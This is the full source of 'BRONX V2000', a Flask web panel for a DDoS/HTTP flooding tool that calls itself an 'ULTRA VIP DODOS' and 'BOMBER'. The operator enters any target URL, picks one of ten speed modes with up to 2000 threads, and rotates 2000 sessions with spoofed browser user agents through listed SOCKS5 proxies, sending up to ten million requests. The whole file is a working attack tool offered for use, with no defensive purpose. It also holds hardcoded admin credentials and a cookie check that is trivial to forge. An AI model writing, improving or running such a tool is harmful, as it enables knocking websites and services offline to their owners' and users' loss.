from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import json
import os
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ========== ATTACK SYSTEM ==========
active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []
total_lifetime = {"success": 0, "failed": 0, "total": 0}
rate_limit_config = {"enabled": False, "rpm": 15}
ip_log = []

# ========== MULTI-SESSION SYSTEM (2000 SESSIONS) ==========
multi_session_enabled = False
session_pool = []
MAX_SESSIONS = 2000

def create_sessions(count=500):
    global session_pool
    session_pool = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ]
    
    for _ in range(min(count, MAX_SESSIONS)):
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
        })
        session_pool.append(s)
    return len(session_pool)

def get_multi_session():
    if not session_pool:
        create_sessions(500)
    return random.choice(session_pool)

CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5","104.16.0.1","104.16.0.2","104.16.0.3","172.67.0.1","172.67.0.2"]
SOCKS5_PROXIES = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208","162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080","173.212.239.43:1080"]

# ========== 10 SPEED MODES ==========
SPEEDS = {
    "slow": {"rate":2,"delay":0.2,"workers":10,"desc":"🐢 SLOW"},
    "medium": {"rate":5,"delay":0.15,"workers":25,"desc":"⚡ MEDIUM"},
    "fast": {"rate":10,"delay":0.1,"workers":50,"desc":"🔥 FAST"},
    "veryfast": {"rate":50,"delay":0.05,"workers":100,"desc":"💨 VERY FAST"},
    "ultra": {"rate":100,"delay":0.02,"workers":200,"desc":"💀 ULTRA"},
    "lightning": {"rate":200,"delay":0.01,"workers":350,"desc":"⚡ LIGHTNING"},
    "flash": {"rate":500,"delay":0.005,"workers":500,"desc":"💎 FLASH"},
    "god": {"rate":750,"delay":0.002,"workers":750,"desc":"👑 GOD"},
    "extreme": {"rate":1000,"delay":0.001,"workers":1000,"desc":"💥 EXTREME"},
    "ultraflash": {"rate":2000,"delay":0.0001,"workers":2000,"desc":"💀 ULTRA FLASH"},
}

# ============================================
# LOGIN PAGE (v20 STYLE - KEPT ORIGINAL)
# ============================================
LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V2000</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.06) 1px,transparent 1px);background-size:30px 30px;animation:bgMove 20s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(30px,30px)}}
.box{background:rgba(5,0,10,0.97);padding:50px 40px;border-radius:24px;border:2px solid rgba(255,0,85,0.25);width:440px;text-align:center;z-index:1;box-shadow:0 0 120px rgba(255,0,85,0.2),0 0 250px rgba(0,200,255,0.08);animation:pulseBox 3s infinite}
@keyframes pulseBox{50%{box-shadow:0 0 180px rgba(255,0,85,0.4),0 0 300px rgba(0,200,255,0.15)}}
.logo{font-size:5em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 40px rgba(255,0,85,0.9))}}
h1{font-size:2.2em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff,#fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;margin:10px 0}
.tag{color:#ff0055;font-size:0.7em;letter-spacing:6px;text-transform:uppercase;margin:10px 0;animation:textGlow 2s infinite}@keyframes textGlow{50%{text-shadow:0 0 20px #ff0055,0 0 40px #ff0055}}
.info{color:#888;font-size:0.55em;letter-spacing:2px;margin:8px 0;line-height:1.6}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 35px rgba(255,0,85,0.3);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:800;cursor:pointer;font-size:16px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.4s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 70px rgba(255,0,85,0.8);transform:translateY(-3px)}.btn:active{transform:scale(0.95)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:btnShine 2s infinite}
@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
</style></head><body>
<div class="box">
<div class="logo">💀</div>
<h1>BRONX V2000</h1>
<div class="tag">ULTRA VIP DODOS</div>
<div class="info">👑 2000 MULTI-SESSIONS • 10 SPEED MODES • REAL-TIME COUNTER • DIRECT HIT 👑</div>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS PANEL</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:12px">{{ error }}</p>{% endif %}
</div></body></html>"""

# ============================================
# DASHBOARD (V2000 ULTRA VIP)
# ============================================
DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX V2000 PANEL</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050010;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:15px;line-height:1.4;min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(255,0,85,0.06),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,0.04),transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1500px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:18px 28px;border:1px solid rgba(255,0,85,0.2);border-radius:16px;margin-bottom:18px;background:rgba(255,0,85,0.03);flex-wrap:wrap;gap:12px;animation:headerGlow 3s infinite}
@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.5);box-shadow:0 0 50px rgba(255,0,85,0.2)}}
.header h1{font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff0055,#ffd700,#00ff88,#00c8ff,#fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:16px}
.stat{background:rgba(255,0,85,0.03);border:1px solid rgba(255,0,85,0.12);border-radius:14px;padding:16px;text-align:center;transition:0.3s}
.stat:hover{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2)}
.stat-val{font-size:2.4em;font-weight:900}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}.b{color:#00c8ff}.w{color:#fff}
.stat-label{font-size:0.5em;text-transform:uppercase;letter-spacing:3px;color:#666;margin-top:3px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(420px,1fr));gap:14px;margin-bottom:16px}
.card{background:rgba(255,0,85,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:14px;padding:20px}
.card h3{font-size:0.7em;font-weight:700;letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;color:#ff0055}
input,select,textarea{width:100%;padding:11px 14px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,0,85,0.1);border-radius:8px;color:#fff;margin:4px 0;font-size:12px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2);outline:none}
label{font-size:0.55em;text-transform:uppercase;letter-spacing:2px;color:#888;display:block;margin-top:8px}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:0.7em;letter-spacing:2px;text-transform:uppercase;margin:5px 0;transition:0.3s}
.btn:hover{box-shadow:0 0 40px rgba(255,0,85,0.6);transform:translateY(-2px)}
.btn-red{background:rgba(255,0,0,0.12);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-red:hover{box-shadow:0 0 30px rgba(255,0,0,0.5)}
.btn-green{background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}.btn-green:hover{box-shadow:0 0 25px rgba(0,255,136,0.4)}
.btn-blue{background:rgba(0,200,255,0.1);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}
.btn-reset{background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.2)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:14px;max-height:280px;overflow:auto;font-size:0.65em;font-family:monospace;color:#00ff88}
.log-e{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.55em;letter-spacing:2px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.3}}
.badge-on{background:rgba(0,255,136,0.15);color:#00ff88}
.badge-off{background:rgba(255,0,0,0.12);color:#ff4444}
.toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
.toggle{width:48px;height:26px;background:rgba(255,255,255,0.06);border-radius:13px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#00ff88;box-shadow:0 0 25px rgba(0,255,136,0.4)}.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:25px}
.ip-box{background:rgba(0,0,0,0.5);border:1px solid rgba(255,215,0,0.2);border-radius:8px;padding:10px;text-align:center;font-size:1.2em;color:#ffd700;font-weight:700;margin:6px 0;letter-spacing:2px}
.speed-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:5px;margin:6px 0}
.speed-btn{padding:8px 5px;background:rgba(255,0,85,0.04);border:1px solid rgba(255,0,85,0.1);border-radius:6px;color:#aaa;cursor:pointer;font-size:0.5em;text-align:center;transition:0.2s;font-family:inherit}
.speed-btn:hover,.speed-btn.active{border-color:#ff0055;background:rgba(255,0,85,0.1);color:#ffd700}
.footer{text-align:center;padding:18px;color:rgba(255,255,255,0.1);font-size:0.55em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BRONX V2000</h1><div style="color:#888;font-size:0.5em;letter-spacing:2px">ULTRA VIP BOMBER • 2000 SESSIONS • 10 SPEEDS • DIRECT HIT</div></div>
<div style="display:flex;gap:10px;align-items:center"><span style="color:#666;font-size:0.55em" id="liveTime"></span><a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.6em;letter-spacing:2px">⏏️ LOGOUT</a></div></div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="vS">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="vF">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="vT">0</div><div class="stat-label">📊 SESSION</div></div>
<div class="stat"><div class="stat-val t" id="vLS">0</div><div class="stat-label">🏆 LT SUCCESS</div></div>
<div class="stat"><div class="stat-val t" id="vLT">0</div><div class="stat-label">📊 LT TOTAL</div></div>
<div class="stat"><div class="stat-val b" id="vAct">0</div><div class="stat-label">🔗 ACTIVE</div></div>
</div>

<div class="grid">
<div class="card"><h3>🎯 ATTACK CONFIG (10 SPEED MODES)</h3>
<label>TARGET URL</label><input type="text" id="url" placeholder="https://api.target.com/endpoint">
<div class="row3"><div><label>REQUESTS</label><input type="number" id="count" value="100000"></div><div><label>SPEED</label><select id="speed">{% for k,v in speeds.items() %}<option value="{{k}}">{{v.desc}}</option>{% endfor %}</select></div><div><label>MODE</label><select id="mode"><option value="direct">Direct</option><option value="cf">Cloudflare</option><option value="mixed">Mixed</option></select></div></div>
<button class="btn" onclick="launch()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-red" onclick="stopAll()">⏹️ STOP ALL</button>
<button class="btn btn-reset" onclick="resetStats()">🔄 RESET COUNTERS</button>
<span id="status" style="margin-top:8px;display:block"></span>
</div>

<div class="card"><h3>🔗 MULTI-SESSION (2000 MAX)</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.65em">MULTI-SESSION</span><div class="toggle" id="togMulti" onclick="toggleMulti()"></div><span id="labMulti" style="color:#888;font-size:0.65em">OFF</span></div>
<label>MAX SESSIONS (100-2000)</label><input type="number" id="maxSess" value="500" min="100" max="2000">
<button class="btn btn-green" onclick="saveMulti()">💾 CREATE SESSIONS</button>
<button class="btn btn-blue" onclick="resetSess()">🔄 RESET SESSIONS</button>
<div class="ip-box" id="myIP">Loading IP...</div>
<button class="btn btn-blue" onclick="copyIP()">📋 COPY IP</button>
<div style="margin-top:6px;color:#888;font-size:0.55em" id="sessInfo">Sessions: 0</div>
</div>

<div class="card"><h3>⚙️ RATE LIMITER</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.65em">Rate Limiter</span><div class="toggle" id="togRate" onclick="toggleRate()"></div><span id="labRate" style="color:#888;font-size:0.65em">OFF</span></div>
<label>RPM</label><input type="number" id="rpm" value="15"><button class="btn btn-blue" onclick="saveRate()">💾 SAVE</button></div>

<div class="card"><h3>🔧 PROXY SYSTEM</h3>
<div class="toggle-row"><span style="color:#888;font-size:0.65em">Proxy</span><div class="toggle" id="togProxy" onclick="toggleProxy()"></div><span id="labProxy" style="color:#888;font-size:0.65em">OFF</span></div>
<label>Custom Proxies</label><textarea id="custProxy" rows="2" placeholder="ip:port"></textarea><button class="btn btn-blue" onclick="saveProxy()">💾 SAVE</button></div>
</div>

<div class="card"><h3>📜 BATTLE LOGS</h3><button class="btn btn-red" style="margin-bottom:8px" onclick="clearLogs()">🗑️ CLEAR LOGS</button>
<div class="logs" id="logs"><div class="log-e">💀 BRONX V2000 ULTRA VIP ready!</div></div></div>
<div class="footer">💀 BRONX V2000 • ULTRA VIP BOMBER • 2000 MULTI-SESSIONS • 10 SPEED MODES 💀</div></div>

<script>
var multiOn=false,rateOn=false,proxyOn=false;
function toggleMulti(){multiOn=!multiOn;var t=document.getElementById('togMulti');t.classList.toggle('on',multiOn);var l=document.getElementById('labMulti');l.textContent=multiOn?'ON':'OFF';l.style.color=multiOn?'#00ff88':'#888'}
function toggleRate(){rateOn=!rateOn;var t=document.getElementById('togRate');t.classList.toggle('on',rateOn);var l=document.getElementById('labRate');l.textContent=rateOn?'ON':'OFF';l.style.color=rateOn?'#00ff88':'#888'}
function toggleProxy(){proxyOn=!proxyOn;var t=document.getElementById('togProxy');t.classList.toggle('on',proxyOn);var l=document.getElementById('labProxy');l.textContent=proxyOn?'ON':'OFF';l.style.color=proxyOn?'#00ff88':'#888'}
function saveMulti(){var max=document.getElementById('maxSess').value;fetch('/multi_config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,max:parseInt(max)})}).then(r=>r.json()).then(d=>{alert(d.status+' | Sessions: '+d.count);document.getElementById('sessInfo').textContent='Sessions: '+d.count})}
function saveRate(){var rpm=document.getElementById('rpm').value;fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(rpm)})})}
function saveProxy(){var p=document.getElementById('custProxy').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json())}
function resetSess(){fetch('/reset_sessions',{method:'POST'}).then(()=>{document.getElementById('sessInfo').textContent='Sessions: 0';refresh()})}
function resetStats(){fetch('/reset',{method:'POST'}).then(()=>refresh())}
function clearLogs(){fetch('/clear_logs',{method:'POST'}).then(()=>refreshLogs())}
function stopAll(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span class="badge badge-off">STOPPED</span>';refresh()})}
function copyIP(){var ip=document.getElementById('myIP').textContent;navigator.clipboard.writeText(ip);alert('IP Copied!')}
function launch(){var url=document.getElementById('url').value.trim();var count=parseInt(document.getElementById('count').value);var speed=document.getElementById('speed').value;var mode=document.getElementById('mode').value;if(!url){alert('Enter URL!');return};document.getElementById('status').innerHTML='<span class="badge badge-on">ACTIVE</span>';fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:url,count:count,speed:speed,mode:mode,multi:multiOn,proxy:proxyOn})}).then(()=>{refresh();refreshLogs()})}
function refresh(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('vS').textContent=d.success;document.getElementById('vF').textContent=d.failed;document.getElementById('vT').textContent=d.total;document.getElementById('vLS').textContent=d.lt_success;document.getElementById('vLT').textContent=d.lt_total;document.getElementById('vAct').textContent=d.active||0})}
function refreshLogs(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('myIP').textContent=d.ip})
setInterval(function(){refresh();refreshLogs();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},500)
</script></body></html>"""

# ============================================
# ATTACK ENGINE (MULTI-SESSION SUPPORT)
# ============================================
def send_direct(url, session):
    try:
        session.get(url, timeout=5, verify=False)
        return True
    except: return False

def attack_worker(attack_id, url, count, delay, mode, use_proxy, use_multi):
    session = get_multi_session() if (use_multi and multi_session_enabled) else get_session()
    
    for i in range(count):
        if attack_id not in active_attacks: break
        
        if rate_limit_config["enabled"]:
            time.sleep(60 / rate_limit_config["rpm"])
        
        success = send_direct(url, session)
        
        with threading.Lock():
            if success:
                attack_stats["success"] += 1
                total_lifetime["success"] += 1
            else:
                attack_stats["failed"] += 1
                total_lifetime["failed"] += 1
            attack_stats["total"] += 1
            total_lifetime["total"] += 1
        
        if delay > 0: time.sleep(delay)

def run_attack(attack_id, url, count, speed, mode, use_proxy, use_multi):
    config = SPEEDS.get(speed, SPEEDS["flash"])
    workers = config["workers"]
    
    attack_logs.append(f"⚡ LAUNCH: {url[:60]} | {count} REQ | {speed.upper()} | {workers} WORKERS | MULTI: {'ON' if use_multi else 'OFF'}")
    
    per_worker = max(1, count // workers)
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for _ in range(workers):
            futures.append(executor.submit(attack_worker, attack_id, url, per_worker, config["delay"], mode, use_proxy, use_multi))
        
        for future in as_completed(futures):
            try: future.result()
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="Access Denied")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH, speeds=SPEEDS)

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','').strip()
    count = min(int(d.get('count',1000)), 10000000)
    speed = d.get('speed','flash')
    mode = d.get('mode','direct')
    use_proxy = d.get('proxy',False)
    use_multi = d.get('multi',False)
    
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"atk_{int(time.time()*1000)}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_attack, args=(aid, url, count, speed, mode, use_proxy, use_multi))
    t.daemon=True; t.start()
    return jsonify({"status":"started","speed":speed,"workers":SPEEDS.get(speed,{}).get("workers",0)})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/reset', methods=['POST'])
def reset():
    attack_stats["success"] = 0
    attack_stats["failed"] = 0
    attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_sessions', methods=['POST'])
def reset_sessions():
    global session_pool
    session_pool = []
    return jsonify({"status":"reset"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    attack_logs.clear()
    return jsonify({"status":"cleared"})

@app.route('/multi_config', methods=['POST'])
def multi_config():
    global multi_session_enabled
    d = request.get_json()
    multi_session_enabled = d.get('enabled',False)
    max_sess = min(int(d.get('max',500)), MAX_SESSIONS)
    
    if multi_session_enabled:
        count = create_sessions(max_sess)
        return jsonify({"status":"CREATED","count":count})
    return jsonify({"status":"DISABLED","count":0})

@app.route('/rate', methods=['POST'])
def save_rate():
    global rate_limit_config
    d = request.get_json()
    rate_limit_config = {"enabled": d.get('enabled',False), "rpm": d.get('rpm',15)}
    return jsonify({"status":"saved"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved"})

@app.route('/logs')
def logs(): 
    return jsonify({"logs": attack_logs[-50:] if attack_logs else ["💀 V2000 Ready..."]})

@app.route('/stats')
def stats(): 
    return jsonify({**attack_stats, "lt_success": total_lifetime["success"], "lt_total": total_lifetime["total"], "active": len(active_attacks)})

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    port = int(os.environ.get('PORT',5000))
    print("💀 BRONX V2000 ULTRA VIP BOMBER READY!")
    print(f"⚡ Port: {port} | Max Sessions: {MAX_SESSIONS}")
    app.run(host='0.0.0.0', port=port, threaded=True)
